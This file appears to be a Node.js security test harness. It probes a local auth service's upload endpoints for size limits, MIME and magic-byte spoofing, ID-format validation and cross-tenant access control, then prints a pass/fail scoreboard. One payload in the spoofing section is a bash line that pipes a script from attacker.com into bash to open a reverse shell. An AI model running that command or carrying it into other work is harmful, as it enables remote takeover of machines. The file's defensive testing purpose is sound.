// Empirical Storage & Upload Security Attack Harness for Milestone 4 (challenger_m4_1)
// Target: Live Zolexora Auth Service on http://localhost:3081

const BASE_URL = "http://localhost:3081";

async function run() {
  console.log("================================================================================");
  console.log("   CHALLENGER M4 LIVE EMPIRICAL STORAGE & UPLOAD SECURITY ATTACK SUITE   ");
  console.log("   Target: " + BASE_URL);
  console.log("================================================================================\n");

  const results = [];

  function logResult(id, name, expected, actualStatus, actualCode, pass, details = {}) {
    results.push({ id, name, expected, actualStatus, actualCode, pass, details });
    console.log(`[${pass ? "PASS" : "FAIL"}] ${id}: ${name}`);
    console.log(`       Expected: ${expected}`);
    console.log(`       Actual:   HTTP ${actualStatus} (${actualCode})`);
    if (details.rawBody) {
      console.log(`       Body:     ${JSON.stringify(details.rawBody)}`);
    }
    console.log("");
  }

  // ---------------------------------------------------------------------------
  // STEP 0: Baseline Health & Reset
  // ---------------------------------------------------------------------------
  const healthRes = await fetch(`${BASE_URL}/api/v1/health`);
  const healthData = await healthRes.json();
  console.log(`[Setup] Target Health Check: HTTP ${healthRes.status}, Service: ${healthData.service}, Secrets: ${healthData.secrets?.status}`);

  await fetch(`${BASE_URL}/api/v1/test/reset`, { method: "POST" });
  console.log(`[Setup] Repository and rate limiter state reset.\n`);

  // Acquire tokens for RBAC tests
  const loginARes = await fetch(`${BASE_URL}/api/v1/auth/public/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: "consumer@clarityfi.app",
      password: "CorporateSecurePass123!",
      turnstile_token: "0.valid-cf-turnstile-token",
    }),
  });
  const dataA = await loginARes.json();
  const tokenUserA = dataA.customToken;
  const userAZxId = dataA.user?.zolexora_id || "ZX-8K9M-4P2W-7Y3X";

  // Login employee dispatcher (role: manager, in org ZX-ORG-4B8T-9M2K-7Y4X)
  const empRes = await fetch(`${BASE_URL}/api/v1/auth/employee/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      org_id: "ZX-ORG-4B8T-9M2K-7Y4X",
      user_id_or_email: "dispatcher@zolexora.com",
      password: "CorporateSecurePass123!",
      product: "zolexora-tms",
      turnstile_token: "0.valid-cf-turnstile-token",
    }),
  });
  const dataEmp = await empRes.json();
  const tokenEmpMember = dataEmp.customToken;

  console.log(`[Setup] Acquired User A Token (zxId: ${userAZxId}) and Employee Token (manager)\n`);

  // ---------------------------------------------------------------------------
  // ATTACK 1: Oversized Upload (> 10MB)
  // Target: /api/v1/storage/kyc/upload and /api/v1/storage/avatars/upload
  // Requirement: MUST BE REJECTED with HTTP 400 (AUTH_FILE_TOO_LARGE)
  // ---------------------------------------------------------------------------
  console.log("================================================================================");
  console.log(" ATTACK 1: Oversized Upload (>10MB Payload)");
  console.log("================================================================================\n");

  const overLimitBytes = 10 * 1024 * 1024 + 1; // 10,485,761 bytes

  // 1A: KYC Upload via Multipart (>10MB file payload)
  {
    const form = new FormData();
    const bigBlob = new Blob([new Uint8Array(overLimitBytes)], { type: "application/pdf" });
    form.append("file", bigBlob, "oversized_kyc.pdf");
    const res = await fetch(`${BASE_URL}/api/v1/storage/kyc/upload`, {
      method: "POST",
      body: form,
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_FILE_TOO_LARGE";
    logResult(
      "ATTACK-1A",
      "KYC Multipart Upload (>10MB binary payload)",
      "HTTP 400 AUTH_FILE_TOO_LARGE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 1B: Avatar Upload via Multipart (>10MB file payload)
  {
    const form = new FormData();
    const bigBlob = new Blob([new Uint8Array(overLimitBytes)], { type: "image/png" });
    form.append("file", bigBlob, "oversized_avatar.png");
    const res = await fetch(`${BASE_URL}/api/v1/storage/avatars/upload`, {
      method: "POST",
      body: form,
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_FILE_TOO_LARGE";
    logResult(
      "ATTACK-1B",
      "Avatar Multipart Upload (>10MB binary payload)",
      "HTTP 400 AUTH_FILE_TOO_LARGE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 1C: KYC Metadata Upload with size header >10MB
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/kyc/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-File-Mime": "application/pdf",
        "X-File-Size": String(overLimitBytes),
      },
      body: JSON.stringify({
        document_type: "passport",
        mime_type: "application/pdf",
        file_size: overLimitBytes,
      }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_FILE_TOO_LARGE";
    logResult(
      "ATTACK-1C",
      "KYC Metadata Upload with X-File-Size >10MB",
      "HTTP 400 AUTH_FILE_TOO_LARGE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 1D: Avatar Metadata Upload with size header >10MB
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/avatars/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-File-Mime": "image/png",
        "X-File-Size": String(overLimitBytes),
      },
      body: JSON.stringify({}),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_FILE_TOO_LARGE";
    logResult(
      "ATTACK-1D",
      "Avatar Metadata Upload with X-File-Size >10MB",
      "HTTP 400 AUTH_FILE_TOO_LARGE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // ---------------------------------------------------------------------------
  // ATTACK 2: Content-Type & Magic Byte Spoofing
  // Requirement: Malicious payload disguised with header Content-Type: application/pdf
  //              or image/png -> MUST BE REJECTED with HTTP 415 AUTH_INVALID_MIME_TYPE.
  //              Authentic PDF (%PDF-) -> accepted.
  // ---------------------------------------------------------------------------
  console.log("================================================================================");
  console.log(" ATTACK 2: Content-Type & Magic Byte Spoofing");
  console.log("================================================================================\n");

  const shellScriptPayload = Buffer.from("#!/bin/bash\ncurl https://attacker.com/revshell | bash\n");
  const elfBinaryPayload = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]);
  const pngMagicBytes = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
  const authenticPdfPayload = Buffer.from("%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\nxref\ntrailer<<>>\nstartxref\n%%EOF");

  // 2A: Shell script disguised as application/pdf (KYC)
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/kyc/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        document_type: "passport",
        file: `data:application/pdf;base64,${shellScriptPayload.toString("base64")}`,
      }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 415 && body.code === "AUTH_INVALID_MIME_TYPE";
    logResult(
      "ATTACK-2A",
      "Shell script disguised as application/pdf to /api/v1/storage/kyc/upload",
      "HTTP 415 AUTH_INVALID_MIME_TYPE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 2B: ELF executable binary disguised as application/pdf (KYC)
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/kyc/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        document_type: "passport",
        file: `data:application/pdf;base64,${elfBinaryPayload.toString("base64")}`,
      }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 415 && body.code === "AUTH_INVALID_MIME_TYPE";
    logResult(
      "ATTACK-2B",
      "ELF executable binary disguised as application/pdf to /api/v1/storage/kyc/upload",
      "HTTP 415 AUTH_INVALID_MIME_TYPE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 2C: Shell script disguised as image/png (Avatar)
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/avatars/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        file: `data:image/png;base64,${shellScriptPayload.toString("base64")}`,
      }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 415 && body.code === "AUTH_INVALID_MIME_TYPE";
    logResult(
      "ATTACK-2C",
      "Shell script disguised as image/png to /api/v1/storage/avatars/upload",
      "HTTP 415 AUTH_INVALID_MIME_TYPE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 2D: PNG magic bytes disguised as application/pdf (KYC)
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/kyc/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        document_type: "passport",
        file: `data:application/pdf;base64,${pngMagicBytes.toString("base64")}`,
      }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 415 && body.code === "AUTH_INVALID_MIME_TYPE";
    logResult(
      "ATTACK-2D",
      "PNG magic bytes disguised as application/pdf to /api/v1/storage/kyc/upload",
      "HTTP 415 AUTH_INVALID_MIME_TYPE",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 2E: Authentic PDF (%PDF-1.7) -> Accepted
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/kyc/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        document_type: "passport",
        file: `data:application/pdf;base64,${authenticPdfPayload.toString("base64")}`,
      }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 201 && body.document_id && body.mime_type === "application/pdf";
    logResult(
      "ATTACK-2E",
      "Authentic PDF (%PDF-1.7) to /api/v1/storage/kyc/upload",
      "HTTP 201 (Accepted)",
      res.status,
      body.document_id ? "ACCEPTED" : body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // ---------------------------------------------------------------------------
  // ATTACK 3: Crockford ID Validation
  // Requirement: Avatar upload with malformed zxId -> HTTP 400 (AUTH_INVALID_ID_FORMAT)
  //              Org logo upload with malformed orgId -> HTTP 400 (AUTH_INVALID_ORG_ID_FORMAT)
  // ---------------------------------------------------------------------------
  console.log("================================================================================");
  console.log(" ATTACK 3: Crockford ID Validation");
  console.log("================================================================================\n");

  // 3A: Avatar upload with malformed zxId ("ZX-INVALID-123")
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/avatars/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Zolexora-ID": "ZX-INVALID-123",
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ zolexora_id: "ZX-INVALID-123" }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_INVALID_ID_FORMAT";
    logResult(
      "ATTACK-3A",
      'Avatar upload with malformed zxId "ZX-INVALID-123"',
      "HTTP 400 AUTH_INVALID_ID_FORMAT",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 3B: Avatar upload with ambiguous Crockford character 'O' / '1' ("ZX-8K9O-4P1W-7Y3X")
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/avatars/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Zolexora-ID": "ZX-8K9O-4P1W-7Y3X",
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ zolexora_id: "ZX-8K9O-4P1W-7Y3X" }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_INVALID_ID_FORMAT";
    logResult(
      "ATTACK-3B",
      'Avatar upload with non-Crockford characters (O and 1)',
      "HTTP 400 AUTH_INVALID_ID_FORMAT",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 3C: Org logo upload with malformed orgId ("ZX-ORG-INVALID")
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/logos/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Organisation-ID": "ZX-ORG-INVALID",
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ org_id: "ZX-ORG-INVALID" }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 400 && body.code === "AUTH_INVALID_ORG_ID_FORMAT";
    logResult(
      "ATTACK-3C",
      'Org logo upload with malformed orgId "ZX-ORG-INVALID"',
      "HTTP 400 AUTH_INVALID_ORG_ID_FORMAT",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // ---------------------------------------------------------------------------
  // ATTACK 4: Cross-User & Cross-Tenant Upload RBAC
  // Requirement:
  // - User A attempts to upload avatar for User B's zx_id -> HTTP 403 AUTH_FORBIDDEN
  // - User A attempts to upload org logo for org they don't belong to -> HTTP 403 AUTH_FORBIDDEN
  // - Regular member attempts to upload org logo -> HTTP 403 AUTH_FORBIDDEN
  // - Org logo upload for nonexistent org -> HTTP 404 AUTH_ORG_NOT_FOUND
  // ---------------------------------------------------------------------------
  console.log("================================================================================");
  console.log(" ATTACK 4: Cross-User & Cross-Tenant Upload RBAC");
  console.log("================================================================================\n");

  const validTargetUserBZxId = "ZX-3R7V-9Q2B-5M8K";

  // 4A: User A attempts to upload avatar for User B's zx_id
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/avatars/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenUserA}`,
        "X-Zolexora-ID": validTargetUserBZxId,
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ zolexora_id: validTargetUserBZxId }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 403 && body.code === "AUTH_FORBIDDEN";
    logResult(
      "ATTACK-4A",
      "User A attempts to upload avatar for User B (zxId mismatch)",
      "HTTP 403 AUTH_FORBIDDEN",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 4B: User A attempts to upload org logo for an org they do not belong to
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/logos/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenUserA}`,
        "X-Organisation-ID": "ZX-ORG-4B8T-9M2K-7Y4X",
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ org_id: "ZX-ORG-4B8T-9M2K-7Y4X" }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 403 && body.code === "AUTH_FORBIDDEN";
    logResult(
      "ATTACK-4B",
      "User A attempts to upload logo for unaffiliated org",
      "HTTP 403 AUTH_FORBIDDEN",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 4C: Regular employee (manager/member) attempts to upload org logo
  {
    const res = await fetch(`${BASE_URL}/api/v1/storage/logos/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenEmpMember}`,
        "X-Organisation-ID": "ZX-ORG-4B8T-9M2K-7Y4X",
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ org_id: "ZX-ORG-4B8T-9M2K-7Y4X" }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 403 && body.code === "AUTH_FORBIDDEN";
    logResult(
      "ATTACK-4C",
      "Regular employee (non-admin) attempts to upload org logo for their own org",
      "HTTP 403 AUTH_FORBIDDEN",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // 4D: Org logo upload for nonexistent org
  {
    const nonExistentOrg = "ZX-ORG-7777-8888-9999";
    const res = await fetch(`${BASE_URL}/api/v1/storage/logos/upload`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${tokenUserA}`,
        "X-Organisation-ID": nonExistentOrg,
        "X-File-Mime": "image/png",
      },
      body: JSON.stringify({ org_id: nonExistentOrg }),
    });
    const body = await res.json().catch(() => ({}));
    const pass = res.status === 404 && body.code === "AUTH_ORG_NOT_FOUND";
    logResult(
      "ATTACK-4D",
      "Org logo upload for nonexistent org",
      "HTTP 404 AUTH_ORG_NOT_FOUND",
      res.status,
      body.code,
      pass,
      { rawBody: body, headers: Object.fromEntries(res.headers.entries()) }
    );
  }

  // ---------------------------------------------------------------------------
  // FINAL SCOREBOARD
  // ---------------------------------------------------------------------------
  console.log("================================================================================");
  console.log("                           CHALLENGE SCOREBOARD                                 ");
  console.log("================================================================================");
  let totalPass = 0;
  let totalFail = 0;
  for (const r of results) {
    if (r.pass) totalPass++;
    else totalFail++;
    console.log(`[${r.pass ? "PASS" : "FAIL"}] ${r.id}: ${r.name}`);
  }
  console.log("--------------------------------------------------------------------------------");
  console.log(`Total Probes: ${results.length} | Passed: ${totalPass} | Failed: ${totalFail}`);
  const overallVerdict = totalFail === 0 ? "APPROVE" : "REJECT";
  console.log(`OVERALL VERDICT: ${overallVerdict}`);
  console.log("================================================================================\n");

  return { results, overallVerdict, totalPass, totalFail };
}

run().catch((err) => {
  console.error("Test execution failed:", err);
  process.exit(1);
});
